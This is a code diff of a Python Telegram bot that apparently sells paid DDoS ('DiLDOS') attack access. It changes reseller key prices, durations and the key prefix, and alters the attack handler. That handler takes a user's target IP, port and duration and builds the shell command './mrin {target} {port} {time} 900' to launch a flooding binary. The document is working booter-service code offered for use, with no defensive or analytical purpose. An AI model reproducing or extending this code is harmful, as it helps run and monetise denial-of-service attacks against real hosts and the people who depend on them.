@@ -31,7 +31,7 @@ BOT_LINK = "@MRiN_DiLDOS_bot"
 escaped_bot_link = BOT_LINK.replace('_', '\\_')
 
 # Per key cost for resellers
-KEY_COST = {"1hour": 30, "5hours": 80, "1day": 120, "7days": 600, "1month": 1500}
+KEY_COST = {"1hour": 30, "1day": 120, "7days": 600}
 
 # In-memory storage
 users = {}
@@ -42,7 +42,7 @@ last_attack_time = {}
 VOICE_FILE_PATH = 'voice.mp3'
 
 # List of blocked ports
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002]
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002, 32000, 32001, 32002, 32003]
 
 # Read users and keys from files initially
 def load_data():
@@ -73,10 +73,10 @@ def save_keys():
     with open(KEY_FILE, "w") as file:
         json.dump(keys, file)
 
-def create_random_key(length=15):
+def create_random_key(length=10):
     characters = string.ascii_letters + string.digits
     random_key = ''.join(random.choice(characters) for _ in range(length))
-    custom_key = f"VIP-MoY-{random_key}"
+    custom_key = f"MRiNxDiLDOS-{random_key}"
     return custom_key
 
 def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
@@ -252,14 +252,10 @@ def process_redeem_key(message):
         duration = keys[key]["duration"]
         if duration == "1hour":
             expiration_time = add_time_to_current_date(hours=1)
-        elif duration == "5hours":
-            expiration_time = add_time_to_current_date(hours=5)
         elif duration == "1day":
             expiration_time = add_time_to_current_date(days=1)    
         elif duration == "7days":
             expiration_time = add_time_to_current_date(days=7)
-        elif duration == "1month":
-            expiration_time = add_time_to_current_date(months=1)  # Adding 1 month
         else:
             bot.reply_to(message, "Invalid duration in key.")
             return
@@ -336,7 +332,7 @@ def start_command(message):
     # Delete the sent voice message
     bot.delete_message(message.chat.id, sent_message.message_id)
 
-COOLDOWN_PERIOD = 120  # 2 minutes
+COOLDOWN_PERIOD = 150  # 2.5 minutes
 
 @bot.message_handler(func=lambda message: message.text == "🚀 Attack")
 def handle_attack(message):
@@ -385,7 +381,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./smokey {target} {port} {time} 1500"
+                full_command = f"./mrin {target} {port} {time} 900"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n‼️ 𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼"
@@ -571,7 +567,7 @@ def generate_key(message):
     if len(command) != 2:
         bot.reply_to(
             message,
-            "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> \n\n⚙️ 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝙆𝙀𝙔 '𝙨 & 𝘾𝙊𝙎𝙏 : \n     ➖ 𝟭𝗵𝗼𝘂𝗿 : 𝟯𝟬 𝗥𝘀    { `/genkey 1hour` }\n     ➖ 𝟱𝗵𝗼𝘂𝗿𝘀 : 𝟴𝟬 𝗥𝘀    { `/genkey 5hours` }\n     ➖ 𝟭𝗱𝗮𝘆 : 𝟭𝟱𝟬 𝗥𝘀    { `/genkey 1day` }\n     ➖ 𝟳𝗱𝗮𝘆𝘀 : 𝟲𝟬𝟬 𝗥𝘀    { `/genkey 7days` }\n     ➖ 𝟭𝗺𝗼𝗻𝘁𝗵 : 𝟭𝟱𝟬𝟬 𝗥𝘀   { `/genkey 1month` } \n\n                  ‼️  𝗧𝗔𝗣 𝗧𝗢 𝗖𝗢𝗣𝗬  ‼️",
+            "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> \n\n⚙️ 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝙆𝙀𝙔 '𝙨 & 𝘾𝙊𝙎𝙏 : \n     ➖ 𝟭𝗵𝗼𝘂𝗿 : 𝟯𝟬 𝗥𝘀    { `/genkey 1hour` }\n     ➖ 𝟭𝗱𝗮𝘆 : 𝟭𝟱𝟬 𝗥𝘀    { `/genkey 1day` }\n     ➖ 𝟳𝗱𝗮𝘆𝘀 : 𝟲𝟬𝟬 𝗥𝘀    { `/genkey 7days` }\n\n                  ‼️  𝗧𝗔𝗣 𝗧𝗢 𝗖𝗢𝗣𝗬  ‼️",
             parse_mode='Markdown'
         )
         return
